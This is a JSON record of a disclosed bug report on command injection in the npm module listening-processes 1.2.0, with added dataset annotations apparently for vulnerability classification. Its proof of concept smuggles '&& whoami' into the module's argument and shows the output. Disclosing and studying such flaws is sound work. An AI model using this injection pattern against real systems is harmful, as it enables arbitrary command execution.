{
  "reported_to": "Node.js third-party modules",
  "reported_by": "notpwnguy ",
  "title": "[listening-processes] Command Injection",
  "content": "\nI would like to report Command Injection in listening-processes\nIt allows an attacker to execute arbitrary commands.\nModule\nmodule name: listening-processes\nversion: 1.2.0\nnpm page: https://www.npmjs.com/package/listening-processes\nModule Description\nA simple NPM module for retrieving pertinent info on processes which are listening on local ports, and for killing those processes using shell commands lsof, ps, and kill in the background.\nModule Stats\n6 downloads in the last day\n12 downloads in the last week\n28 downloads in the last month\nVulnerability\nVulnerability Description\nAn attacker can execute arbitrary commands by escaping the binaries used by the module since it uses bash commands.\nSteps To Reproduce:\nCode 395 Bytes\n1$ node\n2> const processes = require('listening-processes')\n3> processes(`'Python && whoami >> hh;'`)\n4/bin/sh: \\s.*:[0-9]* (LISTEN): command not found\n5{ Python:\n6   [ { command: 'Python',\n7       pid: '14720',\n8       port: '8000',\n9       invokingCommand:\n10        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }\nCode 18 Bytes\n1$ cat hh\n2notpwnguy\nPatch\nIf you're able to provide a patch with the fix please post it in this section\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\nOPERATING SYSTEM VERSION : Mac Os\nNODEJS VERSION : v10.5.0\nNPM VERSION : 6.2.0\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nArbitrary Commands can be executed!\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1580702400,
  "report_url": "https://hackerone.com/reports/511459",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the 'listening-processes' module (version 1.2.0) in a Node.js environment"
    ],
    [
      2,
      "Execute the vulnerable code snippet: `const processes = require('listening-processes'); processes(\"'Python && whoami >> hh;'\")`"
    ]
  ],
  "vuln_description": "The 'listening-processes' module is vulnerable to command injection because it directly incorporates user input into shell commands without proper sanitization. An attacker can escape the intended command context and execute arbitrary commands by injecting shell metacharacters.",
  "reason": "The vulnerability is straightforward to discover as it follows a common command injection pattern where unsanitized user input is passed directly to shell commands. The attack does not require understanding of complex application states or novel logic, and the interaction between components is obvious (user input directly affects command execution).",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection in a Node.js module, which is not related to authentication or authorization (AuthN/AuthZ) boundaries. The proposed methodologies focus on testing AuthN/AuthZ vulnerabilities by swapping user sessions or resource IDs within the same application context, not on command injection vulnerabilities in third-party modules.",
    "is_detectable": false
  }
}